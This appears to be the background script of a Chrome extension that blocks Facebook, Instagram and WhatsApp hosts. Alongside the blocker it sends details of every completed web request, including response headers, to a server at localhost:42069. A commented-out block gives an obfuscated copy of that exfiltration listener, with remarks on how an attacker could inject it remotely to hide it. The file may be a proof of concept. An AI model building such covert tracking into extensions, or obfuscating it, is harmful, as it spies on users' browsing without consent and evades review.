///<reference path="../../../.WebStorm2019.1/config/javascript/extLibs/global-types/node_modules/@types/chrome/index.d.ts"/>
///<reference path="./shared.ts"/>

import WebRequestBodyDetails = chrome.webRequest.WebRequestBodyDetails;
import WebResponseCacheDetails = chrome.webRequest.WebResponseCacheDetails;
import RequestFilter = chrome.webRequest.RequestFilter;

let filter: RequestFilter = {urls: ["<all_urls>"]};
let myServerAddress = "http://localhost:42069/";

// On installation, initialize chrome sync variables
chrome.runtime.onInstalled.addListener((details => {
    chrome.storage.sync.get({facebookSwitch: true, instagramSwitch: true, whatsappSwitch: true},
        (items) => chrome.storage.sync.set(items));
}));

let blockingFacebook: boolean = true;
let blockingInstagram: boolean = true;
let blockingWhatsapp: boolean = true;
chrome.storage.sync.get({facebookSwitch: true, instagramSwitch: true, whatsappSwitch: true}, items => {
    blockingFacebook = items["facebookSwitch"];
    blockingInstagram = items["instagramSwitch"];
    blockingWhatsapp = items["whatsappSwitch"];
});

let facebookHosts: Array<string> = [];
let facebookHostsFilePath: string = chrome.runtime.getURL("lists/facebook.txt");
fetch(facebookHostsFilePath).then((response) =>
    response.text().then(
        (text) => {
            facebookHosts = text.split("\n");
            facebookHosts.forEach((it, index) => facebookHosts[index] = it.trim());
        }
    )
);

let instagramHosts: Array<string> = [];
let instagramHostsFilePath: string = chrome.runtime.getURL("lists/instagram.txt");
fetch(instagramHostsFilePath).then((response) =>
    response.text().then(
        (text) => {
            instagramHosts = text.split("\n");
            instagramHosts.forEach((it, index) => instagramHosts[index] = it.trim());
        }
    )
);

let whatsappHosts: Array<string> = [];
let whatsappHostsFilePath: string = chrome.runtime.getURL("lists/whatsapp.txt");
fetch(whatsappHostsFilePath).then((response) =>
    response.text().then(
        (text) => {
            whatsappHosts = text.split("\n");
            whatsappHosts.forEach((it, index) => whatsappHosts[index] = it.trim());
        }
    )
);

function now(): string {
    return Date().toString();
}

function sendDataToServer(data: any) {
    data["time"] = now();
    let sent = {data: JSON.stringify(data, null, "  ")};
    console.log(sent.data);
    fetch(myServerAddress, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(sent)
    });
}

// When settings have changed, the popup will send us a message telling us what changed
chrome.runtime.onMessage.addListener(message => {
    let whatChanged: string = message["whatChanged"];
    if (!!whatChanged) {
        chrome.storage.sync.get(whatChanged, items => {
            if (whatChanged === "facebookSwitch") blockingFacebook = items[whatChanged];
            else if (whatChanged === "instagramSwitch") blockingInstagram = items[whatChanged];
            else if (whatChanged === "whatsappSwitch") blockingWhatsapp = items[whatChanged];
        })
    }
});

// Block the sites we need to block
chrome.webRequest.onBeforeRequest.addListener((details: WebRequestBodyDetails) => {
    if (details.url !== myServerAddress) {
        let url = new URL(details.url);
        if (blockingFacebook && facebookHosts.contains(url.hostnameClean())) return {cancel: true};
        if (blockingInstagram && instagramHosts.contains(url.hostnameClean())) return {cancel: true};
        if (blockingWhatsapp && whatsappHosts.contains(url.hostnameClean())) return {cancel: true};
    }
}, filter, ["requestBody", "blocking"]);

// On request completed notify the remote server
chrome.webRequest.onCompleted.addListener((details: WebResponseCacheDetails) => {
    if (details.url !== myServerAddress) {
        sendDataToServer(details);
    }
}, filter, ["responseHeaders"]);

// Below is an obfuscated version of the above onCompleted listener
// we can even store this on a server somewhere and fetch it and inject it here (or make it self injecting) to
// further hide the POST request sent to our server, JS allows for a lot of funky magic like this that an attacker
// can use to hide their actions from interested actors

/*const a = ['onCompleted', 'responseHeaders', 'POST', 'log', 'body', 'stringify', 'time', 'Content-Type', 'addListener', 'url', 'webRequest', 'data', 'application/json', 'headers'];
(function (b, e) {
    const f = function (g) {
        while (--g) {
            b['push'](b['shift']());
        }
    };
    f(++e);
}(a, 0xaa));
const b = function (c, d) {
    c = c - 0x0;
    let e = a[c];
    return e;
};
chrome[b('0x8')][b('0xc')][b('0x6')](f => {
    if (f[b('0x7')] !== myServerAddress) {
        f[b('0x4')] = now();
        const g = {};
        g[b('0x9')] = JSON[b('0x3')](f, null, '\x20\x20');
        let h = g;
        console[b('0x1')](h[b('0x9')]);
        const i = {};
        i[b('0x5')] = b('0xa');
        const j = {};
        j['method'] = b('0x0');
        j[b('0xb')] = i;
        j[b('0x2')] = JSON['stringify'](h);
        fetch(myServerAddress, j);
    }
}, filter, [b('0xd')]);*/
